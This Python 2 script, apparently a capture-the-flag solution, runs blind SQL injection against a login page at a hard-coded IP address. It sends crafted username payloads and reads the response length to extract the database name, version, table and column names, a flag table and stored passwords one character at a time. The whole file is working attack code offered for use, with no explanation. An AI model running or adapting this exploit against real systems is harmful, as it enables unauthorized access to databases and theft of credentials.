
# coding=utf-8

import requests
import random
import hashlib
import base64

s = requests.Session()
url='http://114.55.1.176:4458/user/logCheck.php'


tables_count_num = 0
def test(url):
	data={"username":"a' or '1'#","password":"a"}
	r = s.post(url,data = data)
	print len(r.text.encode('utf-8'))
	print r.text.encode('utf-8')

#获取当前库名
def get_database(url):
	database = ""
	for i in range(1,10):
		for j in xrange(130):
			payload = "ddog123'&&ascii(mid(database(),"+repr(i)+",1))>"+repr(j)+"&&'1'='1&passwd=ddog123&submit=Log+In"
			wheater = get_data(payload)
			if(wheater == 0):
				database+=chr(int(j))
				break
	print "[*] database: "+database
#version
def get_version(url):
	version = ""
	for i in range(1,10):
		for j in xrange(130):
			payload = "f' or (select (ascii(substring(version(),"+repr(i)+",1))>"+repr(j)+"))#"
			wheater = get_data(payload)
			if(wheater == 0):
				version+=chr(int(j))
				break
	print "[*] version: "+version

#获取表名
def get_tables(url):
	tables_number = 0	
	for i in range(0,130):
		payload = "admi' or (select ((SELECT COUNT(*) from information_schema.tables WHERE table_schema = database() limit 0,1) > "+repr(i)+"))#"
		print payload
		wheater = get_data(payload)
		print wheater
		if(wheater == 0):
			tables_number = i
			print "[*] tables_number: "+repr(tables_number)
			break

	for i in range(0,int(tables_number)):
		for j in range(0,130):
			payload = "a' or (select ((SELECT length(table_name) from information_schema.tables WHERE table_schema = DATABASE() limit "+repr(i)+",1) > "+repr(j)+"))#"
			wheater = get_data(payload)
			if(wheater == 0):
				tables_name_len = j
				print "[*] tables_name_len: "+repr(tables_name_len)
				break


		tables_name = ""
		for j in range(0,int(tables_name_len)):
			for k in range(0,130):
				payload = "ad' or select (SELECT ascii(substring(table_name,"+repr(j+1)+",1)) from information_schema.tables WHERE table_schema = DATABASE() limit "+repr(i)+",1) >"+repr(k)+"))#"
				wheater = get_data(payload)
				#print "[!] tables_name:"+chr(int(str))
				if(wheater ==0):
					str = k
					tables_name += chr(int(str))
					break
		print "[*] tables_name:"+ tables_name

#获取列名
def get_columns():
	for i in xrange(130):

		payload = "f' or (select ((SELECT COUNT(*) from information_schema.columns WHERE table_name = 'hhhhhhctf' limit 0,1) > "+repr(i)+"))#"
		wheater = get_data(payload)
		if(wheater == 0):
			columns_count_num = i
			print "[*] columns_number: "+repr(columns_count_num)
			break
	
	for i in range(0,int(columns_count_num)):
		for j in xrange(130):
			payload = "f' or (select ((SELECT length(column_name) from information_schema.columns WHERE table_name = 'hhhhhhctf' limit "+repr(i)+",1) >"+repr(j)+"))#"
			wheater = get_data(payload)
			if(wheater == 0):
				columns_name_len = j
				print "[*] columns_name_len: "+repr(columns_name_len)
				break
		
		columns_name = ""
		for j in range(0,int(columns_name_len)):
			for k in xrange(130):
				payload = "f' or (select ((SELECT ascii(substring(column_name,"+repr(j+1)+",1)) from information_schema.columns WHERE table_name = 'hhhhhhctf' limit "+repr(i)+",1) >"+repr(k)+"))#"
				wheater = get_data(payload)
				if(wheater == 0):
					str = k
					#print "[!] columns_name:"+chr(int(str))
					columns_name += chr(int(str))
					break
			print "[!] columns_name:"+columns_name		
		print "[*] columns_name:"+ columns_name

#获取flag
def get_flag():
	for i in xrange(130):
		payload = "f' or (select((SELECT COUNT(flag) from hhhhhhctf limit 0,1) >"+repr(i)+"))#"
		wheater = get_data(payload)
		if(wheater == 0):
			flag_count_num = i
			print "[*] flag: "+repr(flag_count_num)
			break

	for i in range(0,int(flag_count_num)):
		for j in xrange(130):
			payload = "f' or (select ((SELECT length(flag) from hhhhhhctf limit "+repr(i)+",1) >"+repr(j)+"))#"
			wheater =  get_data(payload)
			if(wheater ==0):
				flag_len = j
				print "[*] flag_len: "+repr(flag_len)
				break

		flag = ""
		for j in range(0,int(flag_len)):
			for k in xrange(130):
				payload = "f' or (select ((SELECT ascii(substring(flag,"+repr(j+1)+",1)),'user' from hhhhhhctf limit "+repr(i)+",1) >"+repr(k)+"))#"
				wheater = get_data(payload)
				if(wheater == 0):
					str = k
					flag += chr(int(str))
					break
			print "[!] flag:"+flag
		print "[*] flag:"+ flag
#强行注当前表username和password
def get_password():
	password=""
	for i in xrange(33):
		for j in range(40,130):
				payload = "f' || substring(password,"+repr(i)+",1)='"+chr(j)+"'#"
				print payload
				wheater =  get_data(payload)
				if(wheater ==0):
					strr = j
					password+=chr(strr)
					print "[*] password: "+password
					break
	print "[*] password: "+password

#获取返回数据
def get_data(payload):
	data={"username":payload,"password":"a"}
	r = s.post(url,data = data)
	lens = len(r.text.encode('utf-8'))
	print r.text.encode('utf-8')
	if(lens == 91):
		return 1
	else:
		return 0


def main():
	get_database(url)
	#get_version(url)
	#get_tables(url)
	#get_columns()
	#get_flag()
	#get_password()
	#test(url)

if __name__ == '__main__':
    main()